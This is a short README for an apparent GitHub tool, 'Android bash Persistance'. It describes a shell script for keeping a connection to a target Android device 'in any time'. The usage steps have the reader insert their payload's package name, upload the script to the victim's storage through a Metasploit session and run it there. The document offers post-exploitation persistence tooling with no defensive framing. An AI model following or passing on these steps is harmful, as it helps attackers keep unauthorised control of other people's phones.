# Android bash Persistance

A bash persistance for get connection from the target in any time 

## Table of Contents

- [Installation](#installation)
- [Usage](#usage)


## Installation

Instructions for how to install and set up the project.

```bash
# Clone the repository
git clone https://github.com/bad-boy2py/Andoird_Persistance.git

# Navigate to the project directory
cd Andoird_Persistance
```
## Usage
1. change 'PayloadPackgeName' in per.sh file with your payload package name
1. to get your payload package name use aapt install it by `sudo apt install aapt -y`
1. to extract package name by aapt use command:
2. `aapt dump badging YourApkPath | grep package:\ name`  change YourApkPath with path for your apk file
 
3. make per.sh excutable by :
`sudo chmod +x per.sh`
4. upload per.sh after make it excutable to target storage, for exmple in metasploit:
`upload per.sh /sdcard`
5. after upload file run it by : `sh per.sh`
